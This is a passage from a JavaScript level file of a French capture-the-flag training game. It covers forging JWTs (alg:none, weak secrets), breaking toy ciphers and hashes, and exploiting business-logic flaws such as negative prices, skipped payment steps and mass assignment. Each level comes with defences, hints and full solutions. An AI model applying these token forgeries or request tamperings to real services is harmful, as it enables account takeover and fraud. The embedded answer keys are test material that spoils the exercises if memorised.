      starter: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYm9iIiwicm9sZSI6InVzZXIifQ.ZmFrZXNpZw\n',
      hints: ['Header alg:none, payload = le JSON complet avec role:admin.', 'base64 du payload = eyJzdWIiOiJ1NDIiLCJuYW1lIjoiRGFuYSIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0', 'eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1NDIiLCJuYW1lIjoiRGFuYSIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.'],
      solution: 'eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1NDIiLCJuYW1lIjoiRGFuYSIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb8_6', ch: 8, ord: 6, title: 'Secret deviné : « secret »', job: 'Chapitre 8 · Jetons & sessions', stars: 5, scene: 'terminal',
      cyber: { sim: 'token', secret: 'secret', flag: 'JWT-WEAK' },
      story: 'Ici le serveur refuse <code>alg:none</code> et vérifie VRAIMENT la signature. Mais le secret de signature est… <code>secret</code>. Un classique des pires mots de passe.',
      goal: 'Signe un jeton valide avec le secret <code>secret</code> et le payload <code>{"user":"eve","role":"admin"}</code>. Le jeton tout prêt est dans le dernier indice.',
      lesson: '<p>Si le secret HMAC est faible, un attaquant le retrouve par dictionnaire, puis signe lui-même des jetons parfaitement valides — avec le rôle qu’il veut.</p>' +
        '<p>Ici la signature correcte est calculée à partir du header, du payload et du secret <code>secret</code>.</p>' +
        '<p>🛡 Défense : secret long et aléatoire (≥ 256 bits), jamais un mot du dictionnaire ; rotation des clés.</p>',
      starter: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZXZlIiwicm9sZSI6ImFkbWluIn0.c2lnOmV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUoxYzJWeUlqb2laWFpsSWl3aWNtOXNaU0k2SW1Ga2JXbHVJbjA6V1JPTkc=\n',
      hints: ['Le starter est signé avec un mauvais secret : il est refusé.', 'Signe le même jeton avec le secret « secret ».', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZXZlIiwicm9sZSI6ImFkbWluIn0.c2lnOmV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUoxYzJWeUlqb2laWFpsSWl3aWNtOXNaU0k2SW1Ga2JXbHVJbjA6c2VjcmV0'],
      solution: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZXZlIiwicm9sZSI6ImFkbWluIn0.c2lnOmV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUoxYzJWeUlqb2laWFpsSWl3aWNtOXNaU0k2SW1Ga2JXbHVJbjA6c2VjcmV0\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb8_7', ch: 8, ord: 7, title: 'Secret deviné : « 123456 »', job: 'Chapitre 8 · Jetons & sessions', stars: 5, scene: 'terminal',
      cyber: { sim: 'token', secret: '123456', flag: 'JWT-WEAK' },
      story: 'Autre serveur, autre secret faible : <code>123456</code>. Payload visé : <code>{"sub":"9","role":"admin"}</code>.',
      goal: 'Signe un jeton valide avec le secret <code>123456</code> et le rôle admin. Jeton prêt dans le dernier indice.',
      lesson: '<p>Un secret numérique court tombe en quelques millisecondes face à un dictionnaire. La signature redevient alors « valide » pour l’attaquant.</p>' +
        '<p>🛡 Défense : secrets générés aléatoirement, stockés hors du code (gestionnaire de secrets), jamais réutilisés entre services.</p>',
      starter: 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI5Iiwicm9sZSI6ImFkbWluIn0.c2lnOmV5SmhiR2NpT2lKSVV6STFOaUo5LmV5SnpkV0lpT2lJNUlpd2ljbTlzWlNJNkltRmtiV2x1SW4wOldST05H\n',
      hints: ['Même jeton, mais signé avec le bon secret.', 'Le secret est « 123456 ».', 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI5Iiwicm9sZSI6ImFkbWluIn0.c2lnOmV5SmhiR2NpT2lKSVV6STFOaUo5LmV5SnpkV0lpT2lJNUlpd2ljbTlzWlNJNkltRmtiV2x1SW4wOjEyMzQ1Ng=='],
      solution: 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI5Iiwicm9sZSI6ImFkbWluIn0.c2lnOmV5SmhiR2NpT2lKSVV6STFOaUo5LmV5SnpkV0lpT2lJNUlpd2ljbTlzWlNJNkltRmtiV2x1SW4wOjEyMzQ1Ng==\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb8_8', ch: 8, ord: 8, title: 'Secret deviné : « qwerty »', job: 'Chapitre 8 · Jetons & sessions', stars: 5, scene: 'terminal',
      cyber: { sim: 'token', secret: 'qwerty', flag: 'JWT-WEAK' },
      story: 'Le secret est <code>qwerty</code>. Payload visé : <code>{"user":"root","role":"admin"}</code>.',
      goal: 'Signe un jeton valide avec le secret <code>qwerty</code> et deviens root/admin. Jeton prêt dans le dernier indice.',
      lesson: '<p>Même méthode : on retrouve le secret dans une liste des mots de passe les plus courants, puis on forge un jeton valide.</p>' +
        '<p>En pratique, des outils (hashcat) cassent un HMAC JWT faible hors ligne, sans jamais interroger le serveur.</p>' +
        '<p>🛡 Défense : entropie forte du secret, surveillance des jetons anormaux, durée de vie courte.</p>',
      starter: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9vdCIsInJvbGUiOiJhZG1pbiJ9.c2lnOmV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUoxYzJWeUlqb2ljbTl2ZENJc0luSnZiR1VpT2lKaFpHMXBiaUo5OldST05H\n',
      hints: ['Le starter a une mauvaise signature.', 'Signe avec le secret « qwerty ».', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9vdCIsInJvbGUiOiJhZG1pbiJ9.c2lnOmV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUoxYzJWeUlqb2ljbTl2ZENJc0luSnZiR1VpT2lKaFpHMXBiaUo5OnF3ZXJ0eQ=='],
      solution: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9vdCIsInJvbGUiOiJhZG1pbiJ9.c2lnOmV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUoxYzJWeUlqb2ljbTl2ZENJc0luSnZiR1VpT2lKaFpHMXBiaUo5OnF3ZXJ0eQ==\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb8_9', ch: 8, ord: 9, title: 'Le jeton complet forgé', job: 'Chapitre 8 · Jetons & sessions', stars: 5, scene: 'terminal',
      cyber: { sim: 'token', flag: 'JWT-NONE' },
      story: 'Dernier entraînement : tu forges un jeton réaliste, avec émetteur, sujet, nom, rôle et portée, en profitant de <code>alg:none</code>.',
      goal: 'Forge un jeton <b>alg:none</b> avec le payload <code>{"iss":"megacorp","sub":"4242","name":"Eve","role":"admin","scope":"all"}</code>.',
      lesson: '<p>Un payload « riche » n’est pas plus sûr : sans vérification de signature, chaque champ reste à la main de l’attaquant (rôle, portée, émetteur…).</p>' +
        '<p>Encode le JSON complet en base64url, colle-le après le header <code>none</code>, signature vide.</p>' +
        '<p>🛡 Défense : refuser <code>none</code>, vérifier signature + <code>iss</code> + expiration, et <b>toujours</b> décider des droits côté serveur, pas d’après le jeton.</p>',
      starter: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYm9iIiwicm9sZSI6InVzZXIifQ.ZmFrZXNpZw\n',
      hints: ['Header alg:none, payload = le JSON complet avec role:admin.', 'base64 du payload = eyJpc3MiOiJtZWdhY29ycCIsInN1YiI6IjQyNDIiLCJuYW1lIjoiRXZlIiwicm9sZSI6ImFkbWluIiwic2NvcGUiOiJhbGwifQ', 'eyJhbGciOiJub25lIn0.eyJpc3MiOiJtZWdhY29ycCIsInN1YiI6IjQyNDIiLCJuYW1lIjoiRXZlIiwicm9sZSI6ImFkbWluIiwic2NvcGUiOiJhbGwifQ.'],
      solution: 'eyJhbGciOiJub25lIn0.eyJpc3MiOiJtZWdhY29ycCIsInN1YiI6IjQyNDIiLCJuYW1lIjoiRXZlIiwicm9sZSI6ImFkbWluIiwic2NvcGUiOiJhbGwifQ.\n',
      tests: [{}], rules: {}
    },

    /* ===================================================================
     *  CHAPITRE 9 — Cryptographie (César, dictionnaire de hash, XOR)
     * =================================================================== */
    {
      id: 'cyb9_1', ch: 9, ord: 1, title: 'César revisité', job: 'Chapitre 9 · Cryptographie', stars: 4, scene: 'terminal',
      cyber: { sim: 'crypto', kind: 'caesar', cipher: 'iodj{yhql_ylgl_ylfl}', plain: 'flag{veni_vidi_vici}', flag: 'flag{veni_vidi_vici}' },
      story: 'Un message de César intercepté sur le campus. Chaque lettre est décalée d’un cran fixe.',
      goal: 'Déchiffre <code>iodj{yhql_ylgl_ylfl}</code>. Le panneau de droite montre les 26 rotations : écris celle qui a du sens (elle commence par <code>flag{</code>).',
      lesson: '<p>Le chiffre de César n’a que 25 clés : on les teste toutes (force brute). On choisit la rotation qui donne un texte lisible.</p>' +
        '<p>Ici le texte a été décalé de +3 : il faut donc reculer de 3 (ou avancer de 23) pour lire le clair.</p>' +
        '<p>🛡 Défense : jamais de « chiffre maison » pour un secret réel ; utiliser de la vraie cryptographie (AES).</p>',
      starter: 'iodj{yhql_ylgl_ylfl}\n',
      hints: ['Regarde la colonne des rotations : laquelle commence par « flag{ » ?', 'Le décalage appliqué est +3 ; recule de 3.', 'flag{veni_vidi_vici}'],
      solution: 'flag{veni_vidi_vici}\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb9_2', ch: 9, ord: 2, title: 'Un autre décalage', job: 'Chapitre 9 · Cryptographie', stars: 4, scene: 'terminal',
      cyber: { sim: 'crypto', kind: 'caesar', cipher: 'yetz{khm_wbq_gxny}', plain: 'flag{rot_dix_neuf}', flag: 'flag{rot_dix_neuf}' },
      story: 'Même technique, décalage différent. À toi de trouver lequel.',
      goal: 'Déchiffre <code>yetz{khm_wbq_gxny}</code> en lisant la bonne rotation.',
      lesson: '<p>On ne connaît pas toujours la clé à l’avance : on parcourt les 26 rotations et on repère le mot clair.</p>' +
        '<p>🛡 Défense : la sécurité par petite clé (26 possibilités) n’existe pas. Clés longues et vraie crypto.</p>',
      starter: 'yetz{khm_wbq_gxny}\n',
      hints: ['Parcours les rotations jusqu’à « flag{ ».', 'Le texte a été décalé de +19.', 'flag{rot_dix_neuf}'],
      solution: 'flag{rot_dix_neuf}\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb9_3', ch: 9, ord: 3, title: 'Mot de passe courant', job: 'Chapitre 9 · Cryptographie', stars: 4, scene: 'terminal',
      cyber: { sim: 'crypto', kind: 'hash', hash: 'h17f6dc38', algo: 'toyHash', flag: 'CRACKED' },
      story: 'On a volé une base : un seul compte, admin, avec son mot de passe <b>haché</b>. Le hachage est faible et le mot de passe… très courant.',
      goal: 'Trouve le mot de passe dont le hash est <code>h17f6dc38</code>. Essaie les grands classiques des pires mots de passe.',
      lesson: '<p>Un hash n’est pas réversible, mais on peut hacher des millions de mots courants et comparer : c’est l’attaque par <b>dictionnaire</b>.</p>' +
        '<p>Le mot de passe fait partie du top 3 mondial des pires mots de passe.</p>' +
        '<p>🛡 Défense : hachage lent et salé (argon2, bcrypt), politique de mots de passe, limitation des tentatives.</p>',
      starter: 'admin\n',
      hints: ['Essaie les mots de passe les plus courants au monde.', 'Celui-ci est littéralement le mot « password ».', 'password'],
      solution: 'password\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb9_4', ch: 9, ord: 4, title: 'Un cran plus rusé', job: 'Chapitre 9 · Cryptographie', stars: 4, scene: 'terminal',
      cyber: { sim: 'crypto', kind: 'hash', hash: 'h715ae1b3', algo: 'toyHash', flag: 'CRACKED' },
      story: 'Autre hash volé. Le mot de passe est un peu moins évident, mais figure dans toutes les listes de dictionnaire.',
      goal: 'Retrouve le mot de passe dont le hash est <code>h715ae1b3</code>.',
      lesson: '<p>Les listes de dictionnaire (rockyou…) contiennent des millions de mots de passe réels. « laisse-moi entrer » en anglais y est en très bonne place.</p>' +
        '<p>🛡 Défense : sel unique par utilisateur, fonction de hachage lente, et surtout des mots de passe non devinables (gestionnaire de mots de passe).</p>',
      starter: 'admin\n',
      hints: ['C’est un mot anglais qui veut dire « laisse-moi entrer ».', 'Trois mots collés : let me in.', 'letmein'],
      solution: 'letmein\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb9_5', ch: 9, ord: 5, title: 'XOR à une lettre', job: 'Chapitre 9 · Cryptographie', stars: 5, scene: 'terminal',
      cyber: { sim: 'crypto', kind: 'xor', cipherHex: '2d272a2c30332439143e251424283f2e3f36', flag: 'XOR-BROKEN' },
      story: 'Un développeur a « chiffré » un secret avec un XOR et une clé d’<b>une seule lettre</b>.',
      goal: 'Trouve la clé d’un caractère qui déchiffre le message. Le clair commence par <code>flag{</code>. Écris la clé dans l’éditeur.',
      lesson: '<p>XOR avec une clé d’un octet : chaque octet du clair est <code>chiffré XOR clé</code>. Comme on connaît le début du clair (<code>f</code>), la clé = <code>chiffré[0] XOR \'f\'</code>.</p>' +
        '<p>On peut aussi tester les 256 valeurs possibles et garder celle qui donne du texte lisible.</p>' +
        '<p>🛡 Défense : jamais de XOR « maison » ni de clé courte réutilisée ; crypto authentifiée (AES-GCM).</p>',
      starter: 'A\n',
      hints: ['La clé fait un seul caractère : il n’y a que 256 possibilités.', 'chiffré[0] XOR \'f\' donne la lettre de la clé.', 'K'],
      solution: 'K\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb9_6', ch: 9, ord: 6, title: 'XOR à deux lettres', job: 'Chapitre 9 · Cryptographie', stars: 5, scene: 'terminal',
      cyber: { sim: 'crypto', kind: 'xor', cipherHex: '2e05290e330d2d1c3036270a3c0c3c1a6914', flag: 'XOR-BROKEN' },
      story: 'Cette fois la clé fait <b>deux lettres</b>, répétées sur tout le message.',
      goal: 'Retrouve la clé de 2 lettres. Le clair commence toujours par <code>flag{</code>.',
      lesson: '<p>Clé répétée : <code>clé[0]</code> chiffre les octets pairs, <code>clé[1]</code> les impairs. Avec le clair connu <code>fl</code> au début : <code>clé[0]=chiffré[0]^\'f\'</code>, <code>clé[1]=chiffré[1]^\'l\'</code>.</p>' +
        '<p>🛡 Défense : ne jamais réutiliser une clé courte ; chaque message doit avoir sa clé/nonce unique.</p>',
      starter: 'AB\n',
      hints: ['La clé répétée fait 2 octets.', 'Utilise « fl » comme début connu du clair pour lire les 2 lettres de la clé.', 'Hi'],
      solution: 'Hi\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb9_7', ch: 9, ord: 7, title: 'XOR à trois lettres', job: 'Chapitre 9 · Cryptographie', stars: 5, scene: 'terminal',
      cyber: { sim: 'crypto', kind: 'xor', cipherHex: '2d29382c3e2d392a30381a352e312d39202a36', flag: 'XOR-BROKEN' },
      story: 'Clé de <b>trois lettres</b> répétée. On connaît le début du clair : <code>flag{</code> (5 caractères).',
      goal: 'Retrouve la clé de 3 lettres majuscules.',
      lesson: '<p>Avec 5 caractères de clair connus (<code>flag{</code>) et une clé de 3, tu obtiens la clé entière : <code>chiffré[i] XOR clair[i]</code> pour i=0,1,2 donne les 3 lettres.</p>' +
        '<p>🛡 Défense : crypto moderne et authentifiée, clés longues et aléatoires, jamais réutilisées.</p>',
      starter: 'ABC\n',
      hints: ['XOR les 3 premiers octets du chiffré avec « fla » pour lire la clé.', 'La clé fait 3 lettres majuscules.', 'KEY'],
      solution: 'KEY\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb9_8', ch: 9, ord: 8, title: 'XOR à quatre lettres', job: 'Chapitre 9 · Cryptographie', stars: 5, scene: 'terminal',
      cyber: { sim: 'crypto', kind: 'xor', cipherHex: '362d32342b3026322433360c3f22273624320c303c24352e', flag: 'XOR-BROKEN' },
      story: 'Clé de <b>quatre lettres</b> répétée. Le principe ne change pas : seule la longueur augmente.',
      goal: 'Retrouve la clé de 4 lettres majuscules. Le clair commence par <code>flag{</code>.',
      lesson: '<p>On a assez de clair connu (<code>flag{</code> = 5 caractères) pour une clé de 4 : <code>clé[i] = chiffré[i] XOR clair[i]</code>, i de 0 à 3.</p>' +
        '<p>Plus la clé est courte par rapport au message, plus elle se devine : c’est la faiblesse du XOR à clé répétée.</p>' +
        '<p>🛡 Défense : clé aussi longue que le message (masque jetable) OU, en pratique, crypto authentifiée standard.</p>',
      starter: 'AAAA\n',
      hints: ['Prends les 4 premiers octets du chiffré XOR « flag ».', 'La clé fait 4 lettres majuscules.', 'PASS'],
      solution: 'PASS\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb9_9', ch: 9, ord: 9, title: 'Le XOR brisé', job: 'Chapitre 9 · Cryptographie', stars: 5, scene: 'terminal',
      cyber: { sim: 'crypto', kind: 'xor', cipherHex: '2823372635373933113d33312b3b331e2b3c221e2d2e25322b32', flag: 'XOR-BROKEN' },
      story: 'Dernier entraînement du chapitre : une clé plus longue (4 lettres), mais le message est plus long aussi — la clé se répète plusieurs fois.',
      goal: 'Retrouve la clé de 4 lettres majuscules qui déchiffre tout le message (il commence par <code>flag{</code>).',
      lesson: '<p>Quand une clé se répète, un cryptanalyste peut aussi retrouver sa longueur (indice de coïncidence) puis attaquer chaque position comme un simple César. Ici le début connu suffit.</p>' +
        '<p><code>clé[i] = chiffré[i] XOR \'flag\'[i]</code> pour i de 0 à 3 te donne les quatre lettres.</p>' +
        '<p>🛡 Défense : ne jamais réutiliser une clé ; utiliser des primitives éprouvées (libsodium, AES-GCM) plutôt qu’un XOR artisanal.</p>',
      starter: 'ABCD\n',
      hints: ['Même méthode : chiffré[0..3] XOR « flag ».', 'La clé fait 4 lettres majuscules et se répète.', 'NOVA'],
      solution: 'NOVA\n',
      tests: [{}], rules: {}
    },

    /* ===================================================================
     *  CHAPITRE 10 — Mission rouge (logique : enchaîner les failles)
     * =================================================================== */
    {
      id: 'cyb10_1', ch: 10, ord: 1, title: 'Le rôle envoyé par le client', job: 'Chapitre 10 · Mission rouge', stars: 5, scene: 'terminal',
      cyber: {
        sim: 'logic', flag: 'flag{role_cote_client}',
        defense: 'Défense : ne jamais faire confiance à un rôle envoyé par le client ; le rôle se déduit de la session serveur.',
        state: function () { return { user: 'invite' }; },
        panel: function (st, req) {
          req = req || {};
          return { title: 'Portail interne — session : ' + st.user, html: '<p class="cy-note">Le serveur lit le champ « role » directement dans ta requête. Mauvaise idée.</p><table class="cy-res"><tr><th>paramètre</th><th>valeur reçue</th></tr><tr class="' + (req.role === 'admin' ? 'cy-hit' : '') + '"><td>role</td><td>' + (req.role || '—') + '</td></tr></table>' };
        },
        check: function (st, req) {
          if (req.role === 'admin') return { ok: true, msg: 'Le serveur t’accorde les droits « admin » parce que tu l’as demandé.', win: 'Tu as obtenu le rôle admin simplement en l’envoyant dans la requête.' };
          return { fail: 'Rôle « ' + (req.role || 'absent') + ' » : pas admin. Que se passe-t-il si tu demandes « admin » toi-même ?' };
        }
      },
      story: 'Première étape de la mission rouge. Le portail interne décide de tes droits… d’après un champ <code>role</code> que TON navigateur envoie.',
      goal: 'Deviens administrateur en envoyant le bon rôle :<pre>role: admin</pre>',
      lesson: '<p>C’est l’erreur de confiance la plus simple : le serveur croit le client sur parole. Si <code>role</code> arrive dans la requête, on le change.</p>' +
        '<p>Écris la requête ligne par ligne, format <code>clé: valeur</code>.</p>' +
        '<p>🛡 Défense : le rôle vient de la session serveur, jamais d’un champ fourni par l’utilisateur.</p>',
      starter: 'role: user\n',
      hints: ['Le serveur lit le champ role tel quel.', 'Demande le rôle admin.', 'role: admin'],
      solution: 'role: admin\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb10_2', ch: 10, ord: 2, title: 'Le prix négatif', job: 'Chapitre 10 · Mission rouge', stars: 5, scene: 'terminal',
      cyber: {
        sim: 'logic', flag: 'flag{prix_negatif}',
        defense: 'Défense : valider côté serveur que les montants sont positifs ; ne jamais calculer un total à partir d’un prix fourni par le client.',
        state: function () { return { solde: '0.00' }; },
        panel: function (st, req) {
          req = req || {};
          var p = req.price !== undefined ? Number(req.price) : null;
          return { title: 'Boutique — porte-monnaie : ' + st.solde + ' €', html: '<p class="cy-note">Le total est calculé avec le prix que TU envoies.</p><table class="cy-res"><tr><th>price</th><th>effet</th></tr><tr class="' + (p !== null && p < 0 ? 'cy-hit' : '') + '"><td>' + (req.price === undefined ? '—' : req.price) + '</td><td>' + (p === null ? 'aucun achat' : (p < 0 ? 'le magasin te CRÉDITE ' + (-p) + ' €' : 'tu paies ' + p + ' €')) + '</td></tr></table>' };
        },
        check: function (st, req) {
          var p = req.price !== undefined ? Number(req.price) : NaN;
          if (!isNaN(p) && p < 0) return { ok: true, msg: 'Prix négatif accepté : au lieu de payer, tu es remboursé de ' + (-p) + ' €.', win: 'Un prix négatif inverse la transaction : la boutique te paie.' };
          return { fail: 'Prix « ' + (req.price === undefined ? 'absent' : req.price) + ' » : rien d’anormal. Et si le prix était négatif ?' };
        }
      },
      story: 'Deuxième étape. La boutique calcule le total du panier à partir du champ <code>price</code> envoyé par le client, sans vérifier qu’il est positif.',
      goal: 'Fais-toi créditer de l’argent en envoyant un prix négatif :<pre>price: -100</pre>',
      lesson: '<p>Si le serveur additionne un prix fourni par le client, un prix négatif transforme un achat en remboursement. C’est une faille de logique métier.</p>' +
        '<p>🛡 Défense : prix côté serveur (base de données), validation stricte (montant &gt; 0), contrôle de cohérence.</p>',
      starter: 'price: 10\n',
      hints: ['Le serveur accepte le prix tel quel.', 'Essaie une valeur négative.', 'price: -100'],
      solution: 'price: -100\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb10_3', ch: 10, ord: 3, title: 'Le paramètre caché', job: 'Chapitre 10 · Mission rouge', stars: 5, scene: 'terminal',
      cyber: {
        sim: 'logic', flag: 'flag{param_debug_cache}',
        defense: 'Défense : désactiver tout mode debug en production ; ne pas laisser de paramètres « cachés » qui exposent des données.',
        state: function () { return { page: 'profil' }; },
        panel: function (st, req) {
          req = req || {};
          var on = String(req.debug).toLowerCase() === 'true';
          return { title: 'Page : ' + (req.view || st.page), html: '<p class="cy-note">Certaines API gardent un mode debug oublié, activé par un paramètre non documenté.</p><table class="cy-res"><tr><th>debug</th><th>état</th></tr><tr class="' + (on ? 'cy-hit' : '') + '"><td>' + (req.debug === undefined ? '—' : req.debug) + '</td><td>' + (on ? 'MODE DEBUG : secrets exposés' : 'normal') + '</td></tr></table>' };
        },
        check: function (st, req) {
          if (String(req.debug).toLowerCase() === 'true') return { ok: true, msg: 'Mode debug activé : la page vide toute sa configuration, secrets compris.', win: 'Un paramètre caché « debug=true » a révélé des données sensibles.' };
          return { fail: 'Rien de spécial. Essaie d’ajouter un paramètre que les développeurs auraient laissé traîner (pense « debug »).' };
        }
      },
      story: 'Troisième étape. En inspectant l’API, tu soupçonnes un paramètre de débogage oublié en production.',
      goal: 'Garde ta requête normale et ajoute le paramètre caché :<pre>view: profil\ndebug: true</pre>',
      lesson: '<p>Le « parameter fuzzing » consiste à tester des paramètres non documentés (<code>debug</code>, <code>admin</code>, <code>test</code>…). Certains déverrouillent des fonctions dangereuses.</p>' +
        '<p>🛡 Défense : pas de mode debug en prod, configuration par environnement, revue des paramètres acceptés.</p>',
      starter: 'view: profil\n',
      hints: ['Ta requête normale ne suffit pas : ajoute un paramètre.', 'Les devs oublient souvent un debug=true.', 'view: profil\ndebug: true'],
      solution: 'view: profil\ndebug: true\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb10_4', ch: 10, ord: 4, title: 'Sauter l’étape de paiement', job: 'Chapitre 10 · Mission rouge', stars: 5, scene: 'terminal',
      cyber: {
        sim: 'logic', flag: 'flag{paiement_saute}',
        defense: 'Défense : la machine à états d’un paiement vit côté serveur ; chaque étape vérifie que la précédente a réellement eu lieu.',
        state: function () { return { etapes: ['panier', 'paiement', 'confirm'] }; },
        panel: function (st, req) {
          req = req || {};
          var paid = String(req.paid).toLowerCase() === 'true';
          return { title: 'Tunnel d’achat', html: '<p class="cy-note">Étapes prévues : panier → paiement → confirm. Le serveur fait confiance au champ « step ».</p><table class="cy-res"><tr><th>step</th><th>paid</th><th>résultat</th></tr><tr class="' + (req.step === 'confirm' && paid ? 'cy-hit' : '') + '"><td>' + (req.step || '—') + '</td><td>' + (req.paid || '—') + '</td><td>' + (req.step === 'confirm' && paid ? 'commande validée SANS paiement' : 'en cours') + '</td></tr></table>' };
        },
        check: function (st, req) {
          if (req.step === 'confirm' && String(req.paid).toLowerCase() === 'true') return { ok: true, msg: 'Tu as sauté directement à l’étape « confirm » en te déclarant payé.', win: 'La commande est validée sans jamais passer par le paiement.' };
          return { fail: 'Étape « ' + (req.step || 'absente') + ' » (paid=' + (req.paid || 'non') + '). Pour contourner, va directement à la confirmation en prétendant avoir payé.' };
        }
      },
      story: 'Quatrième étape. Le tunnel d’achat suit normalement panier → paiement → confirmation. Mais le serveur croit le client sur l’étape en cours.',
      goal: 'Saute l’étape de paiement en te déclarant déjà payé :<pre>step: confirm\npaid: true</pre>',
      lesson: '<p>Quand chaque étape fait confiance aux champs envoyés (<code>step</code>, <code>paid</code>), on peut forcer la machine à états et passer de « panier » à « confirmé » sans payer.</p>' +
        '<p>🛡 Défense : état du tunnel conservé côté serveur ; une étape ne s’active que si la précédente est prouvée (paiement vérifié par le prestataire).</p>',
      starter: 'step: panier\n',
      hints: ['Deux champs : step et paid.', 'Va directement à confirm en disant que tu as payé.', 'step: confirm\npaid: true'],
      solution: 'step: confirm\npaid: true\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb10_5', ch: 10, ord: 5, title: 'Affectation massive', job: 'Chapitre 10 · Mission rouge', stars: 5, scene: 'terminal',
      cyber: {
        sim: 'logic', flag: 'flag{affectation_massive}',
        defense: 'Défense : liste blanche des champs modifiables (jamais « tout l’objet ») ; is_admin ne doit pas être assignable depuis un formulaire de profil.',
        state: function () { return { champsAutorises: ['name', 'email'] }; },
        panel: function (st, req) {
          req = req || {};
          var admin = /^(true|1)$/i.test(String(req.is_admin));
          var rows = '';
          ['name', 'email', 'is_admin'].forEach(function (k) { rows += '<tr class="' + (k === 'is_admin' && admin ? 'cy-hit' : '') + '"><td>' + k + '</td><td>' + (req[k] === undefined ? '—' : req[k]) + '</td></tr>'; });
          return { title: 'Mise à jour du profil', html: '<p class="cy-note">Le serveur recopie TOUS les champs reçus dans l’objet utilisateur, même ceux non prévus.</p><table class="cy-res"><tr><th>champ</th><th>valeur</th></tr>' + rows + '</table>' };
        },
        check: function (st, req) {
          if (/^(true|1)$/i.test(String(req.is_admin))) return { ok: true, msg: 'Le champ is_admin a été recopié dans ton profil : tu es administrateur.', win: 'Mass assignment : un champ non prévu (is_admin) a été accepté par le formulaire.' };
          return { fail: 'Profil mis à jour, mais tu n’es pas admin. Et si tu glissais un champ que le formulaire n’attend pas ?' };
        }
      },
      story: 'Cinquième étape. Le formulaire de profil enregistre <b>tous</b> les champs reçus dans ton compte, sans filtrer lesquels.',
      goal: 'Glisse un champ non prévu pour devenir admin :<pre>name: Eve\nemail: eve@corp\nis_admin: true</pre>',
      lesson: '<p>L’<b>affectation massive</b> (mass assignment) : le serveur fait <code>user.update(tousLesChamps)</code>. En ajoutant <code>is_admin</code>, on modifie un attribut qui n’aurait jamais dû être exposé.</p>' +
        '<p>🛡 Défense : n’accepter qu’une liste blanche de champs ; séparer les attributs sensibles.</p>',
      starter: 'name: Eve\nemail: eve@corp\n',
      hints: ['Le serveur accepte tous les champs envoyés.', 'Ajoute is_admin: true aux champs du profil.', 'name: Eve\nemail: eve@corp\nis_admin: true'],
      solution: 'name: Eve\nemail: eve@corp\nis_admin: true\n',
      tests: [{}], rules: {}
    },
    {
      id: 'cyb10_6', ch: 10, ord: 6, title: 'La remise fabriquée', job: 'Chapitre 10 · Mission rouge', stars: 5, scene: 'terminal',
      cyber: {
        sim: 'logic', flag: 'flag{remise_cote_client}',
        defense: 'Défense : la remise est calculée et plafonnée côté serveur à partir d’un code validé, jamais prise telle quelle dans la requête.',
        state: function () { return { prixCatalogue: '199.00' }; },
        panel: function (st, req) {
          req = req || {};
          var d = req.discount !== undefined ? Number(req.discount) : NaN;
          var q = req.qty !== undefined ? Number(req.qty) : NaN;
          var win = !isNaN(d) && d >= 100 && !isNaN(q) && q > 0;
          return { title: 'Panier — article à ' + st.prixCatalogue + ' €', html: '<p class="cy-note">Le total applique le pourcentage de remise ET la quantité, tous deux fournis par le client.</p><table class="cy-res"><tr><th>discount (%)</th><th>qty</th><th>à payer</th></tr><tr class="' + (win ? 'cy-hit' : '') + '"><td>' + (req.discount === undefined ? '—' : req.discount) + '</td><td>' + (req.qty === undefined ? '—' : req.qty) + '</td><td>' + (win ? '0,00 € (gratuit)' : '…') + '</td></tr></table>' };
        },
        check: function (st, req) {
          var d = req.discount !== undefined ? Number(req.discount) : NaN;
          var q = req.qty !== undefined ? Number(req.qty) : NaN;
          if (!isNaN(d) && d >= 100 && !isNaN(q) && q > 0) return { ok: true, msg: 'Remise de ' + d + '% sur ' + q + ' article(s) : total nul, commande gratuite.', win: 'Une remise à 100 % fournie par le client rend la commande gratuite.' };
